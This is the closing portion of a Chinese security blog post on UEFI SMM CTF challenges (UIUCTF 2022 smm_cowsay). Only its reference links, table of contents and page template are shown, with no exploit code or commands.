<p><a target="_blank" rel="noopener" href="https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/">https://toh.necst.it/uiuctf/pwn/system/x86/rop/UIUCTF-2022-SMM-Cowsay/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdeModulePkg/Core">https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdeModulePkg/Core</a></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xiananren.github.io">Xman</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/">https://xiananren.github.io/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xiananren.github.io" target="_blank">Xman</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240826172151044.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/09/21/kernel%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" title="kernel知识点记录"><img class="cover" src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240921102915450.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">kernel知识点记录</div></div></a></div><div class="next-post pull-right"><a href="/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="UEFI固件漏洞学习"><img class="cover" src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240823100432360.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">UEFI固件漏洞学习</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://pic.imgdb.cn/item/63f38a68f144a010071d33b2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Xman</div><div class="author-info__description">r3kapig&S1uM4i战队,主要研究移动相关逆向和漏洞安全</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">33</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">18</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">live a life</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#UIUCTF-2022-smm-cowsay-1"><span class="toc-number">1.</span> <span class="toc-text">UIUCTF 2022-smm_cowsay_1</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84"><span class="toc-number">1.2.</span> <span class="toc-text">题目文件结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E8%A7%88"><span class="toc-number">1.3.</span> <span class="toc-text">总览</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">1.4.</span> <span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#patches"><span class="toc-number">1.4.1.</span> <span class="toc-text">patches</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EFI-System-Table"><span class="toc-number">1.4.2.</span> <span class="toc-text">EFI System Table</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#shellcode%E8%BF%90%E8%A1%8C"><span class="toc-number">1.4.3.</span> <span class="toc-text">shellcode运行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">1.4.4.</span> <span class="toc-text">漏洞点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.4.5.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#get-LocateProtocal"><span class="toc-number">1.4.5.1.</span> <span class="toc-text">get LocateProtocal</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#get-mSmmCommunication"><span class="toc-number">1.4.5.2.</span> <span class="toc-text">get mSmmCommunication</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#print-flag"><span class="toc-number">1.4.5.3.</span> <span class="toc-text">print flag?</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#debug"><span class="toc-number">1.4.5.4.</span> <span class="toc-text">debug</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text">总结</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#UIUCTF-2022-smm-cowsay-2"><span class="toc-number">2.</span> <span class="toc-text">UIUCTF 2022-smm_cowsay_2</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E8%A7%88-1"><span class="toc-number">2.2.</span> <span class="toc-text">总览</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/09/21/kernel%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" title="kernel知识点记录"><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240921102915450.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="kernel知识点记录"/></a><div class="content"><a class="title" href="/2024/09/21/kernel%E7%9F%A5%E8%AF%86%E7%82%B9%E8%AE%B0%E5%BD%95/" title="kernel知识点记录">kernel知识点记录</a><time datetime="2024-09-21T02:51:39.106Z" title="发表于 2024-09-21 10:51:39">2024-09-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/" title="UEFI SMM题目训练"><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240826172151044.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UEFI SMM题目训练"/></a><div class="content"><a class="title" href="/2024/08/26/UEFI%20SMM%E9%A2%98%E7%9B%AE%E8%AE%AD%E7%BB%83/" title="UEFI SMM题目训练">UEFI SMM题目训练</a><time datetime="2024-08-26T08:43:13.355Z" title="发表于 2024-08-26 16:43:13">2024-08-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="UEFI固件漏洞学习"><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240823100432360.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UEFI固件漏洞学习"/></a><div class="content"><a class="title" href="/2024/08/23/UEFI%E5%9B%BA%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="UEFI固件漏洞学习">UEFI固件漏洞学习</a><time datetime="2024-08-23T01:38:52.046Z" title="发表于 2024-08-23 09:38:52">2024-08-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/16/%E5%86%85%E6%A0%B8pwn%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="内核pwn刷题笔记"><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240516011457265.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="内核pwn刷题笔记"/></a><div class="content"><a class="title" href="/2024/05/16/%E5%86%85%E6%A0%B8pwn%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/" title="内核pwn刷题笔记">内核pwn刷题笔记</a><time datetime="2024-05-15T17:12:13.852Z" title="发表于 2024-05-16 01:12:13">2024-05-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/05/03/miasm%E3%80%903%E3%80%91--shellcode%E5%88%86%E6%9E%90/" title="miasm学习【3】--动态shellcode分析"><img src="https://xiananren-1308648057.cos.ap-guangzhou.myqcloud.com/image-20240418202703334.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="miasm学习【3】--动态shellcode分析"/></a><div class="content"><a class="title" href="/2024/05/03/miasm%E3%80%903%E3%80%91--shellcode%E5%88%86%E6%9E%90/" title="miasm学习【3】--动态shellcode分析">miasm学习【3】--动态shellcode分析</a><time datetime="2024-05-03T05:03:50.195Z" title="发表于 2024-05-03 13:03:50">2024-05-03</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By Xman</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>